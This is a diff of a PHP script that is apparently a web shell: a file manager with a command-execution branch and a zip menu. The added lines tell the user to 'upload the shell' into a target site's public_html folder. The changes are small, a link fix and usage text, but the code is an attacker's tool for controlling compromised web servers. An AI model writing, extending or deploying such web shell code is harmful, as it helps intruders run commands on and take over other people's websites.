@@ -309,7 +309,7 @@ function action() {
 	echo "</table>";
 	print "<br><center>";
 	print "[ <a href='?'>File Manager</a> ] ";
-	print "[ <a href='?dir=".path()."&do=unzip''>ZIP MENU</a> ]";
+	print "[ <a href='?do=unzip'>ZIP MENU</a> ]";
 	print "</center><br />";
 	if(isset($_GET['do'])) {
 		if($_GET['do'] === "cmd") {
@@ -334,8 +334,10 @@ function action() {
 				files_and_folder();
 			}
 		}
-elseif($_GET['do'] == 'unzip') {
+elseif(isset($_GET['do']) && ($_GET['do'] == 'unzip')) {
 	echo "<center><h1>Zip Menu</h1>";
+	echo "Note: Upload the shell and run the zip-menu in the folder u want to use<br>";
+	echo "( ex: /home/user/public_html/name_folder_page )<br></br>";
 function rmdir_recursive($dir) {
     foreach(scandir($dir) as $file) {
        if ('.' === $file || '..' === $file) continue;
